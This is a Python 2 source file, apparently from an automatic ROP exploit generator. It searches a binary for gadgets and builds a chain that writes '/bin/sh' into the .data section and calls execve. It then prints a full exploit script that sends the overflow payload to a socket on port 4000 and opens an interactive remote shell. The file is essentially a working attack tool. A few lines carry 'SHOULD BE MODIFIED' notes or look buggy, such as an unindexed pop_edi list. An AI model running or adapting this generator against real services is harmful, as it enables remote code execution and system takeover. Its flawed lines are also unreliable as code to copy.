#!/usr/bin/env python
from RopChainer import *
from util import *

tab = " " * 4 # set tab

# check address whether contain bad char such as '\n'
def check_address(addr):
    return False if "\x0a" in p32(addr) else True

def get_address(addrs):
    for addr in addrs:
        if check_address(addr):
            return addr
    return None

class ScriptMaker(object):

    def __init__(self, gadget,padding=0, pop_level=0):
        self.__Gadget = gadget
        self.__gadgets = self.__Gadget.getGadgets()
        self.chainer = RopChainer(self.__gadgets)
        self.prepare_gadgets()
        self.padding = padding
        self.pop_level = pop_level

    def prepareHeader(self):
        Header  = "#!/usr/bin/env python" + "\n"
        Header += "from util import *" + "\n"
        Header += "import socket" + "\n"
        Header += "import sys" + "\n"
        Header += "\n"

        Header += "padding  = \"A\" * " + str(self.padding) + "\n"
        Header += "\n"
        Header += "\n"

        return Header

    def prepare_gadgets(self):
        # get all single pop eax ebx ecx edx
        self.pop_eax = self.chainer.searchSingleGadgets("pop eax")
        self.pop_ebx = self.chainer.searchSingleGadgets("pop ebx")
        self.pop_ecx = self.chainer.searchSingleGadgets("pop ecx")
        self.pop_edx = self.chainer.searchSingleGadgets("pop edx")
        self.pop_esi = self.chainer.searchSingleGadgets("pop esi")
        self.pop_edi = self.chainer.searchSingleGadgets("pop edi")

        # get all single xor eax ebx ecx edx
        self.xor_eax = self.chainer.searchSingleGadgets("xor eax")
        self.xor_ebx = self.chainer.searchSingleGadgets("xor ebx")
        self.xor_ecx = self.chainer.searchSingleGadgets("xor ecx")
        self.xor_edx = self.chainer.searchSingleGadgets("xor edx")

        # get all single inc eax ebx ecx edx
        self.inc_eax = self.chainer.searchSingleGadgets("inc eax")
        self.inc_ebx = self.chainer.searchSingleGadgets("inc ebx")
        self.inc_ecx = self.chainer.searchSingleGadgets("inc ecx")
        self.inc_edx = self.chainer.searchSingleGadgets("inc edx")

        # get pop gadget length more then one
        self.multi_pop = self.chainer.searchMultiGadgets("pop")
        self.multi_xor = self.chainer.searchMultiGadgets("xor")
        self.multi_inc = self.chainer.searchMultiGadgets("inc")

        # get syscall gadgets
        self.syscall = self.chainer.searchSyscall()

    def make_rop_chain(self, pop_level=0):
        if pop_level >= len(self.multi_pop) or pop_level<0:
            pop_level = 0

        single_pops = {"eax" : self.pop_eax[0]["vaddr"],
                       "ebx" : self.pop_ebx[0]["vaddr"],
                       "ecx" : self.pop_ecx[0]["vaddr"],
                       "edx" : self.pop_edx[1]["vaddr"]}        # THIS LINE SHOULD BE MODIFIED
        # Find .data section and write /bin/sh
        writeAddr = None
        for section in self.__Gadget.getDataSections():
            if section["name"] == ".data":
                writeAddr = section["vaddr"]
                break

        if writeAddr is None:
            return []

        for shell in self.chainer.searchShellGadgets():
            gadget, dstReg, srcReg = shell

            chain = []
            curReg = {
                    "eax": -1,
                    "ebx": -1,
                    "ecx": -1,
                    "edx": -1
                    }

            expReg = {
                    "eax": 0xb,
                    "ebx": writeAddr,
                    "ecx": 0,
                    "edx": 0
                    }

            if dstReg == "eax" and self.pop_eax:
                worker = self.pop_eax[0]
            elif dstReg == "ebx" and self.pop_ebx:
                worker = self.pop_ebx[0]
            elif dstReg == "ecx" and self.pop_ecx:
                worker = self.pop_ecx[0]
            elif dstReg == "edx" and self.pop_edx:
                worker = self.pop_edx[1]            # THIS LINE SHOULD BE MODIFIED
            elif dstReg == "esi" and self.pop_esi:
                worker = self.pop_esi[0]
            elif dstReg == "edi" and self.pop_edi:
                worker = self.pop_edi[0]
            else:
                continue

            if srcReg == "eax" and self.pop_eax:
                mover = self.pop_eax[0]
            elif srcReg == "ebx" and self.pop_ebx:
                mover = self.pop_ebx[0]
            elif srcReg == "ecx" and self.pop_ecx:
                mover = self.pop_ecx[0]
            elif srcReg == "edx" and self.pop_edx:
                mover = self.pop_edx[0]
            elif srcReg == "esi" and self.pop_esi:
                mover = self.pop_esi[0]
            elif srcReg == "edi" and self.pop_edi:
                mover = self.pop_edi
            else:
                continue

            for pops in self.multi_pop[pop_level:]:
                # put /bin
                chain.append({
                    "vaddr": mover["vaddr"],
                    "value": [pStr("/bin")]
                    })


                chain.append({
                    "vaddr": worker["vaddr"],
                    "value": [writeAddr]
                    })
                chain.append({
                    "vaddr": gadget["vaddr"],
                    "value": []
                    })
                # put /sh
                chain.append({
                    "vaddr": mover["vaddr"],
                    "value": [pStr("/sh")]
                    })
                chain.append({
                    "vaddr": worker["vaddr"],
                    "value": [writeAddr+4]
                    })
                chain.append({
                    "vaddr": gadget["vaddr"],
                    "value": []
                    })

                chain.append({
                    "vaddr": single_pops["ebx"],
                    "value": [writeAddr]
                    })

                codes = pops["gadgets"].split(" ; ")[:-1]
                value = []

                for code in codes:
                    reg = code.split()[1]
                    value.append(expReg[reg])
                    curReg[reg] = expReg[reg]
                chain.append({
                    "vaddr": pops["vaddr"],
                    "value": value
                    })

                for reg in curReg.keys():
                    if curReg[reg]!=expReg[reg]:
                        chain.append({
                            "vaddr": single_pops[reg],
                            "value": [expReg[reg]]
                            })

                return chain
        return []

    def prepareChain(self, pop_level=0):
        chain = "chain  = \"\"" + "\n"
        rop_chain = self.make_rop_chain(pop_level)
        for gadget in rop_chain:
            chain += "chain += " + self.prepare_func("p32", gadget["vaddr"]) + "\n"
            for arg in gadget["value"]:
                chain += "chain += " + self.prepare_func("p32", arg) + "\n"
        sysgadget = self.syscall[0]
        chain += "chain += " + self.prepare_func("p32", sysgadget["vaddr"]) + "\n"

        return chain

    def prepare_func(self, name, arg):
        return name + "(" + str(arg) +  ")"

    def make_script(self):
        self.exploit = self.prepareHeader()
        self.exploit += self.prepareChain(self.pop_level)
        self.exploit += "\n"
        self.exploit += "payload = padding + chain" + "\n"
        self.exploit += "r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)" + "\n"
        self.exploit += "r.connect((\"0.0.0.0\", 4000))" + "\n"

        self.exploit += "r.send(payload+\"\\n\")" + "\n"
        self.exploit += "r.settimeout(0.1)" + "\n"
        self.exploit += "shHead = \"$ \"" + "\n"
        self.exploit += "\n"
        self.exploit += "while True:" + "\n"
        self.exploit += tab + "try:" + "\n"
        self.exploit += tab*2 + "command = raw_input(shHead)" + "\n"
        self.exploit += tab*2 + "r.send(command+\"\\n\")" + "\n"
        self.exploit += tab*2 + "l = 1" + "\n"
        self.exploit += tab*2 + "response = \"\"" + "\n"
        self.exploit += tab*2 + "recvLen = 1" + "\n"
        self.exploit += tab*2 + "while recvLen:" + "\n"
        self.exploit += tab*3 + "data = r.recv(4096)" + "\n"
        self.exploit += tab*3 + "recvLen = len(data)" + "\n"
        self.exploit += tab*3 + "response += data" + "\n"
        self.exploit += tab*3 + "if recvLen < 4096:" + "\n"
        self.exploit += tab*4 + "break" + "\n"
        self.exploit += tab*2 + "if not response:" + "\n"
        self.exploit += tab*3 + "continue" + "\n"
        self.exploit += tab*2 + "print response" + "\n"
        self.exploit += tab*1 + "except EOFError, KeyboardInterrupt:" + "\n"
        self.exploit += tab*2 + "print" + "\n"
        self.exploit += tab*2 + "print \"[+] Get EOF\"" + "\n"
        self.exploit += tab*2 + "break" + "\n"
        self.exploit += tab*1 + "except socket.timeout:" + "\n"
        self.exploit += tab*2 + "continue" + "\n"
        self.exploit += tab*1 + "except Exception as e:" + "\n"
        self.exploit += tab*2 + "print str(e)" + "\n"
        self.exploit += tab*2 + "r.close()" + "\n"
        self.exploit += tab*2 + "break"
        print self.exploit
